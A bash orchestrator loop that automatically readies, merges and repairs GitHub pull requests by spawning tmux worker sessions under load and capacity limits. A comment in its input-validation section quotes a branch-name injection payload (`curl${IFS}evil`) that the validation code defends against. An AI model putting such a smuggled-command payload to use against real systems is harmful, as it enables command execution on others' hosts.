#!/bin/bash
# orch-loop.sh — self-sustaining orchestrator loop (bash 3.2).
# Fast, non-blocking cycle: heartbeat -> merge sweep -> capacity-gated dispatch -> background refresh.
set -u
OR="${OR:-daniel-ospina/tortoise}"
REPO="${REPO:-/Users/home/eldato/tortoise}"
O="${O:-$HOME/orchestrator}"
export PATH=/opt/homebrew/bin:/usr/local/bin:$PATH
export AGENT_SKIP_REVIEW_GATE=1 ELDATO_SKIP_VGATE=1

MAX_FIX="${MAX_FIX:-3}"
MAX_FIX_TRIES="${MAX_FIX_TRIES:-3}"
MAX_LOAD="${MAX_LOAD:-16}"
MAX_LANES="${MAX_LANES:-4}"
MAX_REVIEW="${MAX_REVIEW:-4}"   # keep in sync with install.sh's default and README §4
MERGE_PRIORITY_AT="${MERGE_PRIORITY_AT:-10}"   # above this many open PRs, drain before dispatching
MIN_SWAP_FREE="${MIN_SWAP_FREE:-600}"
BATCH="${BATCH:-2}"
CYC="${CYC:-240}"
REQ="ai-review-gate python-ci-gate docs test-isolation license-surface legal-e2e pricing-artifact"

mkdir -p "$O/logs" "$O/state"
LOG="$O/logs/orch-loop.log"
touch "$O/dispatched.txt" "$O/candidates.txt" "$O/checked.txt"
chmod +x "$O"/*.sh 2>/dev/null

# ── input validation ───────────────────────────────────────────────────────────
# These values come from the GitHub API and are then embedded in shell strings that tmux runs via
# `sh -c`, so they are attacker-controlled. git permits ' ; $ ` & | ( ) { } " < > # in a ref name
# (only spaces are forbidden, and ${IFS} supplies those), so a fork PR on branch
# `fix/x';curl${IFS}evil;#` achieved arbitrary command execution on the merge host. Validate.
safe_ref() {
  case "${1:-}" in ''|*[!A-Za-z0-9._/-]*) return 1 ;; esac
  git -C "$REPO" check-ref-format --branch "$1" >/dev/null 2>&1
}
is_num() { case "${1:-}" in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac; }
# $O is operator config, not attacker input, but a quote or metacharacter here would break every
# spawn (the tmux command string is executed via sh -c). Fail loudly instead of failing mysteriously.
case "$O" in
  *"'"*|*'"'*|*'`'*|*'$'*|*';'*|*'|'*|*'&'*|*' '*) echo "[fatal] \$O must not contain a quote or shell metacharacter: $O" >&2; exit 1 ;;
esac

# A stale claim must not mean "in flight" forever: merge-one.sh removes its claim only on clean
# exit, so a SIGKILLed worker or a reboot mid-merge would otherwise stall that PR permanently.
claim_live() {
  local f="$O/state/mergeclaim-$1.lock" p
  [ -f "$f" ] || return 1
  p="$(cat "$f" 2>/dev/null || echo 0)"
  [ "${p:-0}" -gt 0 ] && kill -0 "$p" 2>/dev/null && return 0
  rm -f "$f"; return 1
}

# single-instance lock (atomic: noclobber create fails if the file exists)
LOCKF="$O/.orch.lock"
acq() { ( set -o noclobber; echo $$ > "$LOCKF" ) 2>/dev/null; }
if ! acq; then
  OPID="$(cat "$LOCKF" 2>/dev/null || echo 0)"
  if [ "${OPID:-0}" -gt 0 ] && kill -0 "$OPID" 2>/dev/null; then echo "[orch-loop] already running (pid $OPID)"; exit 0; fi
  rm -f "$LOCKF"
  acq || { echo "[orch-loop] lock race — exiting"; exit 0; }
fi
trap 'rm -f "$LOCKF"' EXIT INT TERM

# A worker whose log has not grown in this many minutes is hung. `pi -p` has no internal
# timeout and a runaway child it spawns (a reviewer's `find /` ran for 8 hours on 2026-10-12)
# keeps the pane alive, so the concurrency caps — which count SESSIONS — silently halve.
STALE_MIN="${STALE_MIN:-40}"

# ── stale-worker reaper ───────────────────────────────────────────────────────
# Kill a worker that has gone silent. It only ever touches tmux sessions, so it can never reach
# the operator's own shell or any process outside the harness. The PR is re-dispatched by the
# normal sweep on the next cycle (the claim_live() check then sees a dead owner and frees it).
reap_stale_workers() {
  local s f age pid
  for s in $(tmux ls -F '#{session_name}' 2>/dev/null | grep -E '^(merge|lane|fix)-'); do
    f="$O/logs/$s.log"
    [ -f "$f" ] || continue
    age=$(( $(date +%s) - $(stat -f '%m' "$f" 2>/dev/null || echo "$(date +%s)") ))
    [ "$age" -gt $((STALE_MIN * 60)) ] || continue
    pid="$(tmux list-panes -t "=$s" -F '#{pane_pid}' 2>/dev/null | head -1)"
    echo "[reap-worker] $s silent ${age}s -> killing session (pane_pid=${pid:-?})" >> "$LOG"
    # `=name` forces an EXACT session match. Without it tmux prefix-matches, so if this session
    # exited between the `tmux ls` snapshot above and here, `-t merge-82` would resolve to the
    # healthy `merge-821` and kill an in-flight worker (verified: `-t zzproof-10` killed
    # `zzproof-101`, while `-t =zzproof-10` errors instead).
    tmux kill-session -t "=$s" 2>/dev/null
    # tmux HUPs the pane's process group; a child that ignored it (e.g. a stuck find) is killed here.
    if [ -n "$pid" ]; then kill -TERM "$pid" 2>/dev/null; sleep 1; kill -KILL "$pid" 2>/dev/null; fi
  done
}

heartbeat() { date +%s > "$O/heartbeat"; }
load1() { sysctl -n vm.loadavg 2>/dev/null | awk '{print int($2)}'; }
# Exact session-name test. `tmux has-session -t <name>` prefix-matches, so a guard for PR #82
# would report "in flight" because `fix-820` exists — starving #82 while that worker lives.
sess() { tmux ls -F '#{session_name}' 2>/dev/null | grep -qx "$1"; }

# Merge priority: a merge backlog means the box's scarce capacity belongs to review+merge, not to
# opening more PRs. These two functions hold the rule so it is directly testable (and so a
# regression cannot hide behind a comment):
#   mp_reason    -> the gate reason when draining should outrank dispatching (empty otherwise)
#   review_slots -> reviewer concurrency, with headroom once a backlog exists
mp_reason() { # <open_prs> <lanes>
  if [ "${1:-0}" -gt "$MERGE_PRIORITY_AT" ] && [ "${2:-0}" -ge 1 ]; then
    echo "merge-priority (${1} open PRs — draining before opening more)"
  fi
}
review_slots() { # <open_prs>
  if [ "${1:-0}" -gt "$MERGE_PRIORITY_AT" ]; then echo $((MAX_REVIEW + 2)); else echo "$MAX_REVIEW"; fi
}

while true; do
  heartbeat
  reap_stale_workers
  L="$(load1)"
  echo "=== $(date) load=$L lanes=$(tmux ls 2>/dev/null | grep -c '^lane-') backlog=$(wc -l < "$O/candidates.txt" | tr -d ' ') ===" >> "$LOG"

  # ---- 1) merge sweep (this box's open PRs) -------------------------------
  # scope: when the repo has >10 open PRs, help drain EVERYONE's (broad); otherwise just this box's.
  OPEN_N="$(gh pr list --repo "$OR" --state open --limit 300 --json number --jq 'length' 2>/dev/null)"; : "${OPEN_N:=0}"
  # Merge priority: a merge backlog means the box's scarce capacity belongs to review+merge, not to
  # opening more PRs. Give reviewers extra headroom above the backlog threshold (and section 2 stops
  # dispatching new lanes). Below it, run a mix. Tune with MERGE_PRIORITY_AT.
  MR="$(review_slots "$OPEN_N")"
  # Scope: >10 open PRs -> BROAD (help drain everyone's). Our OWN patterns are always included
  # even while drafts, because a draft is invisible to the checks below and nothing else would
  # ever ready it — our lanes' own drafts used to stall red forever (#8219, #8085).
  if [ "$OPEN_N" -gt 10 ]; then
    SEL='select(.headRefName|test("^design/|^scope/|^dependabot/")|not)'
    echo "[scope] open=$OPEN_N -> BROAD (help drain all)" >> "$LOG"
  else
    SEL='select(.headRefName|test("-tm$|-cap$|^fix/"))'
    echo "[scope] open=$OPEN_N -> OWN" >> "$LOG"
  fi
  gh pr list --repo "$OR" --state open --limit 300 --json number,headRefName,isDraft \
    --jq ".[]|select((.isDraft|not) or (.headRefName|test(\"-tm$|-cap$|^fix/\")))|$SEL|\"\(.number)\t\(.headRefName)\t\(.isDraft)\"" 2>/dev/null |
  while IFS="$(printf '\t')" read -r PR BR DRAFT; do
    [ -z "${PR:-}" ] && continue
    # Skip anything that is not a plain integer PR / simple ref — never let API data reach a shell.
    is_num "$PR" || { echo "#${PR:-?} SKIPPED (non-numeric PR id)" >>"$LOG"; continue; }
    safe_ref "$BR" || { echo "#$PR SKIPPED (unsafe branch name: $BR)" >>"$LOG"; continue; }
    if [ "${DRAFT:-}" = "true" ]; then
      gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 && echo "#$PR readied (was a draft)" >>"$LOG"
      continue
    fi
    PR_ST="$(gh pr view "$PR" --repo "$OR" --json state --jq .state 2>/dev/null)"
    # CLOSED too: a PR listed open can close between `gh pr list` and here. The retired sweep.sh
    # guarded both; the live rewrite kept only MERGED, so a closed PR fell through to
    # `gh pr ready` + `gh pr merge` every cycle and logged `#<PR> merge fail` forever.
    case "${PR_ST:-}" in MERGED|CLOSED) continue ;; esac
    HEAD_N="$(gh pr view "$PR" --repo "$OR" --json headRefOid --jq .headRefOid 2>/dev/null)"
    # parked = the fixer cap was reached at THIS head; a later push re-arms the PR.
    [ -n "${HEAD_N:-}" ] && [ "$(cat "$O/state/parked-$PR" 2>/dev/null)" = "$HEAD_N" ] && continue
    V="$(gh pr checks "$PR" --repo "$OR" --json name,state 2>/dev/null | python3 -c "
import sys,json
try: d=json.load(sys.stdin)
except Exception: print('NOCHECKS'); raise SystemExit
m={c['name']:c['state'] for c in d}
want='$REQ'.split()
bad=lambda s: s in ('FAILURE','ERROR','CANCELLED','TIMED_OUT','ACTION_REQUIRED')
ok=lambda s: s in ('SUCCESS','FAILURE','ERROR','CANCELLED','TIMED_OUT','ACTION_REQUIRED','SKIPPED','NEUTRAL')
# ai-review-gate IS the merge authority, so it must be an explicit SUCCESS. SKIPPED/NEUTRAL
# there means no signed review exists; reading that as satisfied would merge without evidence.
gate=m.get('ai-review-gate','')
if gate != 'SUCCESS' and not bad(gate):
    print('FAILED:ai-review-gate'); raise SystemExit
fail=[n for n in want if bad(m.get(n,''))]
pend=[n for n in want if not ok(m.get(n,''))]
print(('FAILED:'+','.join(fail)) if fail else (('PENDING:'+','.join(pend)) if pend else 'GREEN'))
" 2>/dev/null)"
    # A CONFLICTING PR can never merge: `gh pr merge` fails every cycle and the queue looks stuck
    # while nothing changes. Route it to the fixer, which integrates origin/main and resolves the
    # conflict, then re-runs the review chain. Capped and parkable like any other fix loop.
    case "$V" in
      GREEN|PENDING:*)
        MSTAT="$(gh pr view "$PR" --repo "$OR" --json mergeable --jq .mergeable 2>/dev/null)"
        if [ "${MSTAT:-}" = "CONFLICTING" ]; then
          CF="$O/state/fixcount-$PR"; NFC="$(cat "$CF" 2>/dev/null || echo 0)"
          case "$NFC" in ''|*[!0-9]*) NFC=0 ;; esac
          if [ "$NFC" -ge "${MAX_FIX_TRIES:-3}" ]; then
            [ -f "$O/state/parked-$PR" ] || { echo "${HEAD_N:-}" > "$O/state/parked-$PR"; echo "#$PR PARKED (still CONFLICTING after $NFC fixes)" >>"$LOG"; }
          elif claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # a worker is already rebasing it
          elif [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ]; then
            printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
            if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
              echo $((NFC + 1)) > "$CF"
              echo "#$PR CONFLICTING -> fixer attempt $((NFC + 1))" >>"$LOG"
            else
              echo "#$PR CONFLICTING, fixer spawn FAILED" >>"$LOG"
            fi
          fi
          continue
        fi ;;
    esac
    case "$V" in
      GREEN)     gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 || true; gh pr merge "$PR" --repo "$OR" --squash >>"$LOG" 2>&1 && echo "#$PR MERGED" >>"$LOG" || echo "#$PR merge fail" >>"$LOG" ;;
      PENDING:*) gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 || true; gh pr merge "$PR" --repo "$OR" --squash --auto >>"$LOG" 2>&1 && echo "#$PR auto-armed" >>"$LOG" || true ;;
      FAILED:*)
        echo "#$PR $V" >>"$LOG"
        if echo "$V" | grep -q ai-review-gate; then
          # The claim file is written by merge-one.sh itself, so it also covers the chain-<N>
          # path (which invokes merge-one.sh directly and whose session name is invisible here).
          if claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # this PR already has a worker in flight
          else
            FIXN="$O/state/fixcount-$PR"; NF="$(cat "$FIXN" 2>/dev/null || echo 0)"
            case "$NF" in ''|*[!0-9]*) NF=0 ;; esac
            # a reviewer already reported real issues AT THIS HEAD -> fix them and re-run the chain.
            # otherwise the gate is probably just missing evidence -> re-record (fresh review).
            if [ -n "${HEAD_N:-}" ] && [ -f "$O/state/needsfix-$PR-$HEAD_N" ] \
               && [ "$NF" -lt "${MAX_FIX_TRIES:-3}" ] \
               && [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ]; then
              # Spawn FIRST, bookkeep only on success: recording the attempt before the spawn
              # means a killed/failed spawn consumes one of MAX_FIX_TRIES and deletes the
              # findings marker, so no fixer ever runs and the findings are lost.
              # Args travel in a file, not interpolated into the tmux command string, so no
              # PR-derived value can reach `sh -c`. Only $O (validated at startup) and the
              # numeric $PR are embedded.
              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
              if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
                echo $((NF + 1)) > "$FIXN"; rm -f "$O/state/needsfix-$PR-$HEAD_N"
                echo "#$PR fixer attempt $((NF + 1))" >>"$LOG"
              else
                echo "#$PR fixer spawn FAILED (attempt not consumed, marker kept)" >>"$LOG"
              fi
            elif [ "$NF" -ge "${MAX_FIX_TRIES:-3}" ] && [ -f "$O/state/needsfix-$PR-$HEAD_N" ]; then
              # Terminal state. Without this the cap just falls through to the re-record branch
              # every cycle: an unfixable PR would burn a full fresh-context review forever.
              echo "${HEAD_N:-}" > "$O/state/parked-$PR"
              echo "#$PR PARKED after $NF fixes at head=${HEAD_N:-?} — needs a human" >>"$LOG"
            elif [ "$(tmux ls 2>/dev/null | grep -c '^merge-')" -lt "$MR" ]; then
              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
              tmux new-session -d -s "merge-$PR" "bash '$O/merge-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null \
                && echo "#$PR re-record" >>"$LOG"
            fi
          fi
        elif echo "$V" | grep -qE 'docs|test-isolation|license-surface|legal-e2e|pricing-artifact'; then
          # A required check OTHER than the review gate or python CI is red — docs lint, a committed
          # conflict marker, legal-e2e, test isolation. Nothing re-recorded or reran those, so such a
          # PR sat red forever with no worker at all (observed: #8278 had conflict markers committed,
          # #8193 a new MD018 finding; both had zero workers for hours). Route them to the fixer,
          # which now also receives the failing CI log, capped like every other fix loop.
          NFC2="$(cat "$O/state/fixcount-$PR" 2>/dev/null || echo 0)"
          case "$NFC2" in ''|*[!0-9]*) NFC2=0 ;; esac
          if [ "$NFC2" -ge "${MAX_FIX_TRIES:-3}" ]; then
            [ -f "$O/state/parked-$PR" ] || { echo "${HEAD_N:-}" > "$O/state/parked-$PR"; echo "#$PR PARKED (CI still red after $NFC2 fixes: $V)" >>"$LOG"; }
          elif claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
            : # a worker is already on it
          elif [ "$(tmux ls 2>/dev/null | grep -c '^fix-')" -lt "${MAX_FIX:-3}" ]; then
            printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
            if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
              echo $((NFC2 + 1)) > "$O/state/fixcount-$PR"
              echo "#$PR CI-red ($V) -> fixer attempt $((NFC2 + 1))" >>"$LOG"
            else
              echo "#$PR CI-red, fixer spawn FAILED" >>"$LOG"
            fi
          fi
        fi
        if echo "$V" | grep -q python-ci-gate; then
          RID="$(gh pr checks "$PR" --repo "$OR" --json name,link --jq '.[]|select(.name=="python-ci-gate")|.link' 2>/dev/null | sed -nE 's#.*/runs/([0-9]+).*#\1#p')"
          if [ -n "${RID:-}" ] && [ ! -f "$O/state/rerun-$PR-$RID" ]; then
            gh run rerun "$RID" --repo "$OR" --failed >>"$LOG" 2>&1 && { touch "$O/state/rerun-$PR-$RID"; echo "#$PR rerun CI" >>"$LOG"; }
          fi
        fi ;;
    esac
  done
  heartbeat

  # ---- 2) capacity-gated dispatch ----------------------------------------
  # prune the backlog of already-dispatched issues (otherwise it reads as non-empty but yields nothing)
  if [ -s "$O/candidates.txt" ]; then
    python3 - "$O/candidates.txt" "$O/dispatched.txt" <<'PY'
import sys
cand=[l.strip() for l in open(sys.argv[1]) if l.strip()]
done=set(l.strip() for l in open(sys.argv[2]) if l.strip())
keep=[x for x in cand if x not in done]
open(sys.argv[1],"w").write("\n".join(keep)+("\n" if keep else ""))
PY
  fi
  L="$(load1)"; LANES="$(tmux ls 2>/dev/null | grep -c '^lane-')"
  SWFREE="$(sysctl -n vm.swapusage 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="free"){print int($(i+2)); exit}}')"
  SWTOTAL="$(sysctl -n vm.swapusage 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="total"){print int($(i+2)); exit}}')"
  : "${SWFREE:=9999}"; : "${SWTOTAL:=0}"
  echo "[cap] lanes=$LANES swap_free=${SWFREE}M swap_total=${SWTOTAL}M load=$L max_load=$MAX_LOAD" >> "$LOG"
  # Three gates. swap_total=0 => swap uninitialised (fresh boot), NOT pressure — allow.
  # Name the binding gate: an earlier version logged "skipped (load=…)" while load was never
  # consulted, so a lanes-bound or swap-bound stall looked like a load stall.
  GATE_WHY="$(mp_reason "${OPEN_N:-0}" "$LANES")"
  if [ -n "$GATE_WHY" ]; then :
  elif [ "$L" -ge "$MAX_LOAD" ]; then GATE_WHY="load=$L>=max_load=$MAX_LOAD"
  elif [ "$LANES" -ge "$MAX_LANES" ]; then GATE_WHY="lanes=$LANES>=max_lanes=$MAX_LANES"
  elif [ "$SWTOTAL" -ne 0 ] && [ "$SWFREE" -le "${MIN_SWAP_FREE:-600}" ]; then GATE_WHY="swap_free=${SWFREE}M<=min_swap_free=${MIN_SWAP_FREE:-600}M"
  fi
  if [ -z "$GATE_WHY" ]; then
    : > "$O/.batch"; K=0
    while read -r ISS; do
      [ -z "${ISS:-}" ] && continue
      grep -qx "$ISS" "$O/dispatched.txt" 2>/dev/null && continue
      echo "$ISS" >> "$O/.batch"; echo "$ISS" >> "$O/dispatched.txt"; K=$((K+1)); [ "$K" -ge "$BATCH" ] && break
    done < "$O/candidates.txt"
    if [ -s "$O/.batch" ]; then
      echo "[dispatch] load=$L lanes=$LANES -> $(tr '\n' ' ' < "$O/.batch")" >> "$LOG"
      bash "$O/dispatch-merge.sh" "$REPO" "$OR" $(tr '\n' ' ' < "$O/.batch") >> "$LOG" 2>&1
    else echo "[dispatch] backlog empty" >> "$LOG"; fi
  else
    echo "[dispatch] skipped ($GATE_WHY)" >> "$LOG"
  fi
  heartbeat

  # ---- 3) background backlog refresh (locked, small, non-blocking) --------
  BL="$(wc -l < "$O/candidates.txt" | tr -d ' ')"
  if [ "$BL" -lt 6 ]; then
    if [ ! -d "$O/.refresh.lock" ]; then
      mkdir -p "$O/.refresh.lock"
      echo "[refresh] spawning (backlog=$BL)" >> "$LOG"
      ( bash "$O/refresh-candidates.sh" 6 >> "$LOG" 2>&1; rm -rf "$O/.refresh.lock" ) &
    else
      # stale lock guard (>20 min)
      if [ -n "$(find "$O/.refresh.lock" -mmin +20 2>/dev/null)" ]; then rm -rf "$O/.refresh.lock"; echo "[refresh] cleared stale lock" >> "$LOG"; fi
    fi
  fi

  sleep "$CYC"
done
